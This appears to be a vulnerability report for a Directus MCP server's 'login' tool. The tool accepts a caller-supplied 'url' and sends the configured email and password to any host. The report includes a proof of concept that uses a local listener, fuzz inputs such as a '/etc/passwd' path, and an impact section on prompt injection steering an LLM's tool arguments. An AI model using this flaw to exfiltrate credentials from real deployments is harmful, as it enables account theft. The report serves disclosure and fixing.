# SSRF in `login`: caller-supplied `url` posts the Directus email and password to any host

**Repository:** `pixelsock/directus-mcp` · **Tool:** `login` · **Tested commit:** `a1ccda3`
**Weakness:** CWE-918 Server-Side Request Forgery (SSRF)

## Summary
`login` authenticates to Directus by POSTing credentials to `<url>/auth/login`. It accepts an optional `url` argument that overrides the configured base URL, and nothing checks the host. A caller can send the login request to any destination the server can reach. The body of that request carries the configured email and password, or the ones supplied in the call.

## Details
The base URL comes straight from the tool argument (`index.ts:530`):

```ts
const url = toolArgs.url || CONFIG.DIRECTUS_URL;
```

`login` passes it to `getAuthToken` (`index.ts:557-561`), which POSTs the credentials (`index.ts:79-86`):

```ts
async function getAuthToken(url: string, email: string, password: string): Promise<string> {
  try {
    const response = await axios.post(`${url}/auth/login`, { email, password });
    return response.data.data.access_token;
```

When the call does not supply `email` and `password`, they default to `CONFIG.DIRECTUS_EMAIL` and `CONFIG.DIRECTUS_PASSWORD`. Nothing restricts the host.

## Steps to reproduce
1. Prerequisites: Node.js and npm. `DIRECTUS_EMAIL` and `DIRECTUS_PASSWORD` set in the environment; use test values.
2. Start a local listener in a separate terminal:
   ```sh
   python3 -m http.server 8099 --bind 127.0.0.1
   ```
3. Start the server as the README describes:
   ```json
   { "command": "npx", "args": ["-y", "@pixelsock/directus-mcp@latest"],
     "env": { "DIRECTUS_URL": "https://directus.example.com", "DIRECTUS_EMAIL": "test@example.com", "DIRECTUS_PASSWORD": "<test-password>" } }
   ```
4. Call the tool with `url` pointing at the listener. Arguments as JSON:
   ```json
   {"url": "http://127.0.0.1:8099/tofu-poc"}
   ```
   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="npx", args=["-y", "@pixelsock/directus-mcp@latest"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("login", {"url": "http://127.0.0.1:8099/tofu-poc"})
               print(result)

   asyncio.run(main())
   ```
5. The listener's log shows the request line `POST /tofu-poc/auth/login`. `http.server` answers POST with 501 but still logs it. The tool returns `Authentication failed: Request failed with status code 501`. The default log does not print the body. Per `getAuthToken` above, the body is `{ email, password }`.

## Expected behavior
The tool should only authenticate against the configured Directus instance. It should never post credentials to another host.

## Actual behavior
The POST goes to whatever host the caller names, with the credentials in the body. In the fuzz logs, a call with a caller-supplied host came back as `Authentication failed:` followed by a TCP connection error from that address. The server had attempted the POST.

## Impact
In MCP, the LLM chooses the tool arguments, and prompt injection in content the model reads can steer them. An attacker who controls `url` can collect the configured Directus email and password by naming a host they control. They can also make the server send requests to hosts it can reach but the attacker cannot. Because the leaked item is the account password, this is the most serious of the tools that share this flaw.

## Suggested fix
Drop the per-call `url` override, or restrict it: accept only the configured Directus origin (or an explicit allowlist), and after DNS resolution block private, loopback, and link-local addresses. Never send the configured credentials to a host that has not been validated.

## Status on the default branch
Still present at `a1ccda3` (2026-04-20). The tested commit is the current `refs/remotes/origin/latest` head.

## Prior reports
- #13 "Server-Side Request Forgery Vulnerability in directus-mcp" (issue, open 2026-04-18): CVE-style report. Its main finding is `uploadFile`'s `fileUrl`, but section 7 also lists the per-request `url` override (`index.ts:522` at commit `7775862`) reaching the ``axios.post(`${url}/auth/login`, { email, password })`` sink as a "related untrusted target selection". This is the same flow as this report; #13 does not spell out the credential-theft impact. No fix linked.
- #14 "fix: patch SSRF vulnerability and upgrade vulnerable dependencies" (PR, open 2026-04-20): adds a `validateUrl` guard (scheme check, DNS resolution, private and loopback address blocking) at the `fileUrl` sink and the per-request `url` override, noting that "any tool could override the Directus API `url` per-request". Would block internal targets once merged, but not merged; it would still let a public attacker-controlled host receive the email and password.
- #19 "Add Streamable HTTP transport support + fix inspector security vulnerabilities" (PR, merged/closed 2026-04-20): merge commit `a1ccda3` is the tested head. Bumps axios and other dependencies and adds an HTTP transport; it does not touch the `url` override, so it does not fix this.
- Documentation: README.md lists `login` ("Login to Directus and get an access token") but never mentions the per-call `url` argument or any restriction on it. There is no SECURITY.md or docs/ directory.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: this exact flow (`url` override to `/auth/login`) is already listed in open issue #13, and open, unmerged PR #14 proposes a fix. Not fixed on the default branch. File as a comment on #13, or as one combined issue that references #13 and #14.
- ToFu class / sanitizers: ssrf (CWE-918). Triggered `check_url_alternative_ip_representations`, `check_url_hostname_canonicalization`, `check_url_ssrf_ip_ranges`, `check_url_structure_and_parsing`.
- Campaigns and executions: corpus-sbx (1536 exec / 1533 ok), e2-0922 (1/1).
- Evidence (verbatim, trimmed):
  - `{'url': 'http://[::1]:8080', 'email': 'ipv6@example.com', 'password': 'ipv6pass'}` → `Error: Authentication failed: connect ECONNREFUSED ::1:8080` (the server attempted the POST).
  - `{'url': '', 'email': '', 'password': ''}` → `Authentication failed: Request failed with status code 405`.
  - `{'url': '/etc/passwd\x00', 'email': 'admin', 'password': 'admin'}` → `Authentication failed: Invalid URL`.
- Hand-check hints: REAL, and the worst of the directus set: the request body carries the email and password, so a caller-chosen `url` is a direct channel for stealing credentials. The ECONNREFUSED result shows the POST is really attempted. The listener reproduction is derived from the code and was not run (READ ONLY).
</details>
